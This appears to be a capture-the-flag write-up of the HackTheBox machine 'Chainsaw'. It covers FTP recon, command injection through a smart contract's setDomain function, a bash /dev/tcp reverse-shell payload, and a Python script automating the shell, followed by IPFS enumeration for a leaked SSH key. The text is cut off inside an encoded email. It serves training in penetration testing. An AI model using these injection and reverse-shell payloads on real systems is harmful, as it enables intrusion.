---
title: HTB: Chainsaw
url: https://0xdf.gitlab.io/2019/11/23/htb-chainsaw.html
date: 2019-11-23T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-chainsaw, ctf, hackthebox, nmap, ftp, solidity, smart-contract, blockchain, python, web3, remix, command-injection, injection, ipfs, ssh, email, john, path-hijack, suid, bmap, df, debugfs, ida, ghidra, pyinstaller, reverse-engineering
---

![Chainsaw](https://0xdfimages.gitlab.io/img/chainsaw-cover.png)

Chainsaw was centered around blockchain and smart contracts, with a bit of InterPlanetary File System thrown in. I’ll get the details of a Solididy smart contract over an open FTP server, and find command injection in it to get a shell. I’ll find an SSH key for the bobby user in IPFS files. bobby has access to a SUID binary that I can interact with two ways to get a root shell. But even as root, the flag is hidden, so I’ll have to dig into the slack space around root.txt to find the flag. In Beyond root, I’ll look at the ChainsawClub binaries to see how they apply the same Web3 techniques I used to get into the box in the first place.

## Box Info

| Name | [Chainsaw](https://hackthebox.com/machines/chainsaw)  [Chainsaw](https://hackthebox.com/machines/chainsaw) [Play on HackTheBox](https://hackthebox.com/machines/chainsaw) |
| --- | --- |
| Release Date | [15 Jun 2019](https://twitter.com/hackthebox_eu/status/1139477759791644673) |
| Retire Date | 23 Nov 2019 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Chainsaw |
| Radar Graph | Radar chart for Chainsaw |
| First Blood User | 01:30:28[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 11:01:43[xct xct](https://app.hackthebox.com/users/13569) |
| Creators | [artikrh artikrh](https://app.hackthebox.com/users/41600)  [absolutezero absolutezero](https://app.hackthebox.com/users/37317) |

## Recon

### nmap

`nmap` shows three ports open. FTP (TCP 21) and SSH (TCP 22) are common. TCP 9810 is unknown to me:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.142
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-04 15:15 EDT
Nmap scan report for 10.10.10.142
Host is up (0.036s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
9810/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
root@kali# nmap -sV -sC -p 21,22,9810 -oA scans/nmap-scripts 10.10.10.142
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-04 15:16 EDT
Nmap scan report for 10.10.10.142
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
|_-rw-r--r--    1 1001     1001           44 Jul 04 19:09 address.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
9810/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Thu, 04 Jul 2019 19:10:19 GMT
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Thu, 04 Jul 2019 19:10:18 GMT
|     Connection: close
|     Request
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: *
|     Content-Type: text/plain
|     Date: Thu, 04 Jul 2019 19:10:18 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9810-TCP:V=7.70%I=7%D=7/4%Time=5D1E50A4%P=x86_64-pc-linux-gnu%r(Get
SF:Request,118,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nAccess-Control-Allow
SF:-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Type,\x20Accept,\x
SF:20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Al
SF:low-Methods:\x20\*\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x200
SF:4\x20Jul\x202019\x2019:10:18\x20GMT\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(HTTPOptions,100,"HTTP/1\.1\x20200\x20OK\r\nAccess
SF:-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x20Content-Type
SF:,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:\x20\*\r\nAcc
SF:ess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text/plain\r\nDate
SF::\x20Thu,\x2004\x20Jul\x202019\x2019:10:18\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n")%r(FourOhFourRequest,118,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nAccess-Control-Allow-Headers:\x20Origin,\x20X-Requested-With,\x20C
SF:ontent-Type,\x20Accept,\x20User-Agent\r\nAccess-Control-Allow-Origin:\x
SF:20\*\r\nAccess-Control-Allow-Methods:\x20\*\r\nContent-Type:\x20text/pl
SF:ain\r\nDate:\x20Thu,\x2004\x20Jul\x202019\x2019:10:19\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.06 seconds

```

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server) this looks like Ubuntu Cosmic (18.10).

### FTP - TCP 21

#### Enumeration

I’ll start by looking at the anonymous FTP access and see what’s there:

```

root@kali# ftp 10.10.10.142
Connected to 10.10.10.142.
220 (vsFTPd 3.0.3)
Name (10.10.10.142:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
-rw-r--r--    1 1001     1001           44 Jul 04 19:09 address.txt
226 Directory send OK.

```

I’ll grab all three files:

```

ftp> prompt
Interactive mode off.
ftp> bin
200 Switching to Binary mode.
ftp> mget *
local: WeaponizedPing.json remote: WeaponizedPing.json
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for WeaponizedPing.json (23828 bytes).
226 Transfer complete.
23828 bytes received in 0.04 secs (638.5010 kB/s)
local: WeaponizedPing.sol remote: WeaponizedPing.sol
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for WeaponizedPing.sol (243 bytes).
226 Transfer complete.
243 bytes received in 0.00 secs (135.1393 kB/s)
local: address.txt remote: address.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for address.txt (44 bytes).
226 Transfer complete.
44 bytes received in 0.00 secs (13.2620 kB/s)
ftp> exit
221 Goodbye.

```

#### Documents

`address.txt` just contains a hex string:

```

root@kali# cat address.txt 
0x810EF49BBA6c9515b9aB1E94759Fa71378019Be7

```

That’s 40 hex digits. Not exactly sure what this is yet.

`WeaponizedPing.sol` gives me a clue as to what I’m dealing with here:

```

root@kali# cat WeaponizedPing.sol 
pragma solidity ^0.4.24;

contract WeaponizedPing 
{
  string store = "google.com";

  function getDomain() public view returns (string) 
  {
      return store;
  }

  function setDomain(string _value) public 
  {
      store = _value;
  }
}

```

This is a Solidity smart contract.

`WeaponizedPing.json` is 599 lines of json clearly related to the contract. It contains the definition of a contract, and the part I’ll use going forward is the `abi`, some json that reflects the interfaces for the contract. You’ll notice it matches the variable and functions from the `.sol` file above. I can use `jq` to select it out of the larger json blob:

```

root@kali# cat WeaponizedPing.json | jq '.abi'
[
  {
    "constant": true,
    "inputs": [],
    "name": "getDomain",
    "outputs": [
      {
        "name": "",
        "type": "string"
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {
        "name": "_value",
        "type": "string"
      }
    ],
    "name": "setDomain",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  }
]

```

### HTTP - TCP 9810

`nmap` showed this as HTTP, but visiting the site returns 400:

```

root@kali# curl 10.10.10.142:9810
400 Bad Request

```

I can’t get the site to do much else at this point. I’ll need to figure out how to interact with Solidity smart contracts.

## Shell as administrator

### Ethereum Background

Solidity is a programming language that allows you to write smart contracts on the Ethereum blockchain. Web3 is the name for the applications / libraries used to interact with these contracts on the blockchain.

From the [Solidity documentation](https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html#):

> A contract in the sense of Solidity is a collection of code (its *functions*) and
> data (its *state*) that resides at a specific address on the Ethereum
> blockchain

It’s clear from the documents I collected over FTP that this is what I’m faced with here. I suspect that Chainsaw port 9810 is a Web3 provider node for an Ethereum smart contract.

### Interacting With the Contract

#### Python

I tend to prefer command line and scripts, so I’m going to use `python` to connect. All the libraries are made for `python3`, so it’s important to make sure I’m using that version. I found the [this article](http://www.dappuniversity.com/articles/web3-py-intro) on connecting to the Ethereum blockchain with python useful.

Install `web3`:

```

root@kali# python3 -m pip install web3
Collecting web3
...[snip]...

```

I’ll start messing around in just a python terminal. Once I get something that works, I can easily move that into a script.

```

root@kali# python3
Python 3.7.3 (default, Apr  3 2019, 05:39:12) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from web3 import Web3
>>> import json

```

Now I’ll connect:

```

>>> infura_url = "http://10.10.10.142:9810"
>>> web3 = Web3(Web3.HTTPProvider(infura_url))
>>> print(web3.isConnected())
True

```

It works!

Now that I’m connected, I want to connect with the interface of this smart contract. I’ll use the `abi` for this. I’ll get it from the file:

```

>>> with open('WeaponizedPing.json') as f:
...     wp = json.load(f)
... 
>>> wp['abi']
[{'constant': True, 'inputs': [], 'name': 'getDomain', 'outputs': [{'name': '', 'type': 'string'}], 'payable': False, 'stateMutability': 'view', 'type': 'function'}, {'constant': False, 'inputs': [{'name': '_value', 'type': 'string'}], 'name': 'setDomain', 'outputs': [], 'payable': False, 'stateMutability': 'nonpayable', 'type': 'function'}]

```

I’ll also need the address from `address.txt` (which changed on box reboot/reset, and maybe in time):

```

>>> with open ('address.txt') as f:
...     address = f.read().strip()
...
>>> address
'0x810EF49BBA6c9515b9aB1E94759Fa71378019Be7'

```

Now I’ll connect with it:

```

>>> contract = web3.eth.contract(address=address, abi=wp['abi'])

```

I’ll enter `contract.functions.[tab]` and see the functions I can use:

```

>>> contract.functions.
contract.functions.abi         contract.functions.getDomain(  contract.functions.setDomain( 

```

With functions in Web3, you use `.call()` when you want to [invoke something that doesn’t publish to the blockchain](https://ethereum.stackexchange.com/questions/765/what-is-the-difference-between-a-transaction-and-a-call), and `.transact()` when you invoke something that does.

`.abi` just prints the input I had given it. I’ll try to `.getDomain()`:

```

>>> contract.functions.getDomain().call()
'google.com'

```

In Web3, you use `call()` for functions that check the value of something, and `transact()` for functions that will write to the blockchain. I’ll try the setter function:

```

>>> contract.functions.setDomain('hackthebox.eu').transact()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/local/lib/python3.7/dist-packages/web3/contract.py", line 1151, in transact
    **self.kwargs
  File "/usr/local/lib/python3.7/dist-packages/web3/contract.py", line 1454, in transact_with_contract_function
    txn_hash = web3.eth.sendTransaction(transact_transaction)
  File "/usr/local/lib/python3.7/dist-packages/web3/eth.py", line 269, in sendTransaction
    [transaction],
  File "/usr/local/lib/python3.7/dist-packages/web3/manager.py", line 112, in request_blocking
    raise ValueError(response["error"])
ValueError: {'message': 'from not found; is required', 'code': -32000, 'data': {'stack': 'TXRejectedError: from not found; is required\n    at StateManager.queueTransaction (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/statemanager.js:309:14)\n    at GethApiDouble.eth_sendTransaction (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/geth_api_double.js:301:14)\n    at GethApiDouble.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/geth_api_double.js:105:10)\n    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)\n    at GethDefaults.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/gethdefaults.js:15:12)\n    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)\n    at SubscriptionSubprovider.FilterSubprovider.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/subproviders/filters.js:89:7)\n    at SubscriptionSubprovider.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/subproviders/subscriptions.js:136:49)\n    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)\n    at DelayedBlockFilter.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/delayedblockfilter.js:31:3)\n    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)\n    at RequestFunnel.handleRequest (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/lib/subproviders/requestfunnel.js:32:12)\n    at next (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:116:18)\n    at Web3ProviderEngine._handleAsync (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:103:3)\n    at Timeout._onTimeout (/usr/local/lib/node_modules/ganache-cli/node_modules/ganache-core/node_modules/web3-provider-engine/index.js:87:12)\n    at ontimeout (timers.js:498:11)\n    at tryOnTimeout (timers.js:323:5)\n    at Timer.listOnTimeout (timers.js:290:5)', 'name': 'TXRejectedError'}}

```

In all of that, the `'code': -32000` jumps out. Some googling reveals that error code is `invalid sender`. After a good bit of trouble shooting, I found I could fix this by setting the default account. I can see the current accounts:

```

>>> web3.eth.accounts
['0x6C65352a23D526379cc13D0F561C207F9b7438F4', '0x1dab0E960630374CD5f31e433b0eF8c2E2cAC9cd', '0xDA5D21Cd343870E9f7704d2207B6A86E978e6e0D', '0xc1C5360749E5094F61509f33fb4789de2d140e9E', '0x2a8300A870fAFDaD1dd4A040b142c61e8A7Bad8B', '0x69f7650BdE72C75F9c5Aec7a08dCBF7a7BE5f6e3', '0xA04f2bc20c6897C717c26B4A7c18FA12225bb4C7', '0x312FAE8221Babe88963410C33EaB9FDf3D45B518', '0x62B14bE59932269E846B64cA4707ebD08472A97b', '0xEa270c885F14f9adaD7516D7A291968955fd2177']

```

Any of them will work. I’ll set one (the 5 is chosen randomly, any account would work):

```

>>> web3.eth.defaultAccount = web3.eth.accounts[5]

```

Now I can transact:

```

>>> contract.functions.getDomain().call()
'google.com'
>>> contract.functions.setDomain('hackthebox.eu').transact()
HexBytes('0xada6c6de9a69c6ed851ab7dd58a9c04c5fcd49b672629a679044f871a7918fd9')
>>> contract.functions.getDomain().call()
'hackthebox.eu'

```

#### Remix

Alternatively, instead of `python`, there’s a browser for Ethereum called [Remix](http://remix.ethereum.org/#optimize=false&evmVersion=null&appVersion=0.7.7&version=soljson-v0.5.1+commit.c8a2cb62.js), where I can interact with the blockchain via javascript in the browser. I’ll head there, and I get a busy page:

[![remix initial](https://0xdfimages.gitlab.io/img/1562311900844.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1562311900844.png)

I’ll delete the two files already on the left (`ballot_test.sol` and `ballet.sol`), and click the plus at the top left to get a new file. I’ll name it `WeaponizedPing.sol`, and paste in that data:

![1562311964999](https://0xdfimages.gitlab.io/img/1562311964999.png)

Next, I’ll find the compiler version that matches my version, `0.4.24`, and select the the commit one:

![1562312035860](https://0xdfimages.gitlab.io/img/1562312035860.png)

I’ll click “Start to compile”. Now I’ll move to the `Run` tab at the top right. I’ll switch the environment to Web3 Provider, and give it the address `http://10.10.10.142:9810` when prompted. Then I’ll paste the address into the “At Address” field, and click that blue button. I’ll see my contract show up at the bottom under “Deployed Contract”, and after I click the triangle to expand it, I can see my functions:

![1562312183839](https://0xdfimages.gitlab.io/img/1562312183839.png)

Clicking “getDomain” returns the domain:

![1562312215140](https://0xdfimages.gitlab.io/img/1562312215140.png)

I can set it as well. When I enter “0xdf.gitlab.io” and click “setDomain”, I see the results in the debug window in the center:

![1562312287957](https://0xdfimages.gitlab.io/img/1562312287957.png)

If I now hit “getDomain”:

![1562312311097](https://0xdfimages.gitlab.io/img/1562312311097.png)

### Injection

Because the name of the contract is WeaponizedPing, I thought something (either the within the contract or something watching on Chainsaw) might be pinging the domain value. I opened up `tcpdump` to look for icmp with `tcpdump -i tun0 -n icmp`. I then updated the contract to point to my ip:

![](https://0xdfimages.gitlab.io/img/chainsaw-ping.gif)

So something is reading the domain and then executing something like `ping -c 1 [input]`. The immediate question is, can I inject into that?

I tried this:

```

>>> contract.functions.setDomain('10.10.14.8; ping -c 2 10.10.14.8').transact()
HexBytes('0x4bf0a6e9c57c72f6ab13b34ad019bea228744d730a016ea1c0ad9eece33fc73c')

```

If my theory from above is right, I’d get 3 pings, because it would execute `ping -c 1 10.10.14.8; ping -c 2 10.10.14.8`. If I only get one ping, the injection didn’t work.

I get 3 pings:

```

15:11:06.716663 IP 10.10.10.142 > 10.10.14.8: ICMP echo request, id 1715, seq 1, length 64
15:11:06.716682 IP 10.10.14.8 > 10.10.10.142: ICMP echo reply, id 1715, seq 1, length 64
15:11:06.751937 IP 10.10.10.142 > 10.10.14.8: ICMP echo request, id 1716, seq 1, length 64
15:11:06.751981 IP 10.10.14.8 > 10.10.10.142: ICMP echo reply, id 1716, seq 1, length 64
15:11:07.754427 IP 10.10.10.142 > 10.10.14.8: ICMP echo request, id 1716, seq 2, length 64
15:11:07.754446 IP 10.10.14.8 > 10.10.10.142: ICMP echo reply, id 1716, seq 2, length 64

```

### Shell

Knowing I can inject, I can run a reverse shell as well:

```

>>> contract.functions.setDomain("google.com; bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'").transact()
HexBytes('0x4a1d4a839ecdeb140fc1ecdbdf5270ef915d3a04100c82365124abbacc1fb70d')

```

And I get a shell on my listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.142.
Ncat: Connection from 10.10.10.142:34244.
bash: cannot set terminal process group (1461): Inappropriate ioctl for device
bash: no job control in this shell
administrator@chainsaw:/opt/WeaponizedPing$ id
uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)

```

### Script It

Putting that all together, I’ll write a Python script to get a shell. It will read the contract files over FTP, then use `Web3` to connect to the contract and issues the shell injection. After a short sleep, it will set the domain back to “google.com”.

```

#!/usr/bin/env python3

import json
import sys
import time
import urllib.request
from subprocess import Popen, PIPE
from web3 import Web3

infra_url = "http://10.10.10.142:9810"

# Get address over FTP
with urllib.request.urlopen('ftp://10.10.10.142/address.txt') as add_ftp:
    address = add_ftp.read().strip().decode()
print(f"[+] Got address over FTP: {address}.")

# Get json over FTP
with urllib.request.urlopen('ftp://10.10.10.142/WeaponizedPing.json') as wp_ftp:
    wp = json.load(wp_ftp)
print(f"[+] Got abi over FTP: {wp['abi']}")

web3 = Web3(Web3.HTTPProvider(infra_url))
if not web3.isConnected():
    print(f"[-] Failed to connect to {infra_url}")
    sys.exit()
print(f"[+] Connected to web3 provider: {infra_url}")

contract = web3.eth.contract(address=address, abi=wp['abi'])
web3.eth.defaultAccount = web3.eth.accounts[5]

print("[*] Starting listener on port 443")
nc = Popen(("nc -nl 443"), shell=True)

print(f"[*] Current domain value is: {contract.functions.getDomain().call()}")
contract.functions.setDomain("google.com").transact()
time.sleep(1)
contract.functions.setDomain("google.com; bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'").transact()
print(f"[+] Domain value now: {contract.functions.getDomain().call()}")
print(f"[*] Sleeping to allow connection")
time.sleep(4)
contract.functions.setDomain("google.com").transact()

time.sleep(.5)

try:
    nc.poll()
    nc.wait()
except:
    sys.stdout.write("\r")

print(f"[+] Set domain value back to {contract.functions.getDomain().call()}")

```

```

root@kali# ./chainsaw_shell.py 
[+] Got address over FTP: 0x8Dfbf1e0cFdB8747bedd6c3754674bbedd24A05C.
[+] Got abi over FTP: [{'constant': True, 'inputs': [], 'name': 'getDomain', 'outputs': [{'name': '', 'type': 'string'}], 'payable': False, 'stateMutability': 'view', 'type': 'function'}, {'constant': False, 'inputs': [{'name': '_value', 'type': 'string'}], 'name': 'setDomain', 'outputs': [], 'payable': False, 'stateMutability': 'nonpayable', 'type': 'function'}]
[+] Connected to web3 provider: http://10.10.10.142:9810
[*] Starting listener on port 443
[*] Current domain value is: google.com
[+] Domain value now: google.com; bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'
[*] Sleeping to allow connection
bash: cannot set terminal process group (1527): Inappropriate ioctl for device
bash: no job control in this shell
administrator@chainsaw:/opt/WeaponizedPing$ id
uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)

```

## Priv: administrator –> bobby

### Enumeration

#### Home Directories

In the homedir, there’s no `user.txt`. There is one other user on Chainsaw, bobby, but I don’t have access to that home folder at all:

```

administrator@chainsaw:/opt/WeaponizedPing$ ls -l /home
total 8
drwxr-x--- 8 administrator administrator 4096 Dec 20  2018 administrator
drwxr-x--- 9 bobby         bobby         4096 Jan 23  2019 bobby

```

Still, there are a couple interesting things in administrator’s home folder:

```

administrator@chainsaw:/home/administrator$ ls -la
total 104
drwxr-x--- 8 administrator administrator  4096 Dec 20  2018 .
drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -> /dev/null
-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout
-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc
-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv
drwxrwxr-x 5 administrator administrator  4096 Jan 23 09:27 .ipfs
drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local
drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2
-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt
-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf
-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -> /dev/null
-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc

```

`chainsaw-emp.csv` is a list of employees, only one of whom, bobby, is active:

```

administrator@chainsaw:/home/administrator$ cat chainsaw-emp.csv 
Employees,Active,Position
arti@chainsaw,No,Network Engineer
bryan@chainsaw,No,Java Developer
bobby@chainsaw,Yes,Smart Contract Auditor
lara@chainsaw,No,Social Media Manager
wendy@chainsaw,No,Mobile Application Developer

```

The `maintain` folder has a script, and another dir with public keys in it:

```

administrator@chainsaw:/home/administrator/maintain$ find .
.
./gen.py
./pub
./pub/bobby.key.pub
./pub/lara.key.pub
./pub/wendy.key.pub
./pub/bryan.key.pub
./pub/arti.key.pub

```

The `gen.py` script just uses Python to create RSA key pairs:

```

administrator@chainsaw:/home/administrator/maintain$ cat gen.py 
#!/usr/bin/python
from Crypto.PublicKey import RSA
from os import chmod
import getpass

def generate(username,password):
        key = RSA.generate(2048)
        pubkey = key.publickey()

        pub = pubkey.exportKey('OpenSSH')
        priv = key.exportKey('PEM',password,pkcs=1)

        filename = "{}.key".format(username)

        with open(filename, 'w') as file:
                chmod(filename, 0600)
                file.write(priv)
                file.close()

        with open("{}.pub".format(filename), 'w') as file:
                file.write(pub)
                file.close()

        # TODO: Distribute keys via ProtonMail

if __name__ == "__main__":
        while True:
                username = raw_input("User: ")
                password = getpass.getpass()
                generate(username,password)

```

The comment about distributing keys over Protonmail is interesting. If I can find evidence of that, I might find the keys.

#### ipfs

There’s also a `.ipfs` folder in administrator’s homedir. [InterPlentary File System](https://en.wikipedia.org/wiki/InterPlanetary_File_System), or IPFS, is a peer-to-peer distributed file system protocol that allows you to use other people’s computers as cloud storage (what could go wrong?).

I’ll look for information about the other user on the box, bobby, and find it:

```

administrator@chainsaw:/home/administrator$ grep -r bobby .
./chainsaw-emp.csv:bobby@chainsaw,Yes,Smart Contract Auditor
Binary file ./.ipfs/blocks/SG/CIQBGBBWXJ4N54A5BUNC7WYVUQNXLEQN67SNFTAPGUMYTYB2UAC4SGI.data matches
Binary file ./.ipfs/blocks/JL/CIQKWHQP7PFXWUXO6CSIFQMFWW4CTR23WJEFINRLPRC6UAP2ZM5EJLY.data matches
./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data:To: bobbyaxelrod600@protonmail.ch <bobbyaxelrod600@protonmail.ch>
./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data:X-Attached: bobby.key.enc
./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data:X-Original-To: bobbyaxelrod600@protonmail.ch
./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data:Delivered-To: bobbyaxelrod600@protonmail.ch
./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data:Content-Type: application/octet-stream; filename="bobby.key.enc"; name="bobby.key.enc"
./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data:Content-Disposition: attachment; filename="bobby.key.enc"; name="bobby.key.enc"
./.ipfs/blocks/SP/CIQJWFQFWYW5QEXAELBZ5WBEDCJBZ2RSPCHVGDOXQ6FM67VBWKVTSPI.data:bobby@chainsaw,Yes,Java Developer

```

`.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data` seems to have references to `bobbyaxelrod600@protonmail.ch`. I’ll check out that file:

```

administrator@chainsaw:/home/administrator$ cat ./.ipfs/blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data

$X-Pm-Origin: internal
X-Pm-Content-Encryption: end-to-end
Subject: Ubuntu Server Private RSA Key
From: IT Department <chainsaw_admin@protonmail.ch>
Date: Thu, 13 Dec 2018 19:28:54 +0000
Mime-Version: 1.0
Content-Type: multipart/mixed;boundary=---------------------d296272d7cb599bff2a1ddf6d6374d93
To: bobbyaxelrod600@protonmail.ch <bobbyaxelrod600@protonmail.ch>
X-Attached: bobby.key.enc
Message-Id: <zctvLwVo5mWy8NaBt3CLKmxVckb-cX7OCfxUYfHsU2af1NH4krcpgGz7h-PorsytjrT3sA9Ju8WNuWaRAnbE0CY0nIk2WmuwOvOnmRhHPoU=@protonmail.ch>
Received: from mail.protonmail.ch by mail.protonmail.ch; Thu, 13 Dec 2018 14:28:58 -0500
X-Original-To: bobbyaxelrod600@protonmail.ch
Return-Path: <chainsaw_admin@protonmail.ch>
Delivered-To: bobbyaxelrod600@protonmail.ch
-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: multipart/related;boundary=---------------------ffced83f318ffbd54e80374f045d2451
-----------------------ffced83f318ffbd54e80374f045d2451
Content-Type: text/html;charset=utf-8
Content-Transfer-Encoding: base64

PGRpdj5Cb2JieSw8YnI+PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj5JIGFtIHdyaXRpbmcgdGhp
cyBlbWFpbCBpbiByZWZlcmVuY2UgdG8gdGhlIG1ldGhvZCBvbiBob3cgd2UgYWNjZXNzIG91ciBM
aW51eCBzZXJ2ZXIgZnJvbSBub3cgb24uIER1ZSB0byBzZWN1cml0eSByZWFzb25zLCB3ZSBoYXZl
